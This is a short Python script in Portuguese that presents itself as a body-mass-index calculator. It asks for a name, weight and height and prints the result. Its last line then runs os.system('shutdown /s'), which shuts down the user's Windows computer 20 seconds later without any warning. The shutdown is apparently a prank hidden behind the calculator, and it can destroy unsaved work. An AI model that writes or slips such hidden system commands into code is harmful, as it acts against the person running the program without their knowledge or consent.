import time
import os


nome = input("Digite o seu nome: ")
peso = float(input("Digite o seu peso: "))
altura = float(input("Digite sua altura: "))

imc = peso/(altura**2)

print(f"Sr(a) {nome}, o seu imc é: {imc}")

time.sleep(20)
   
os.system('shutdown /s')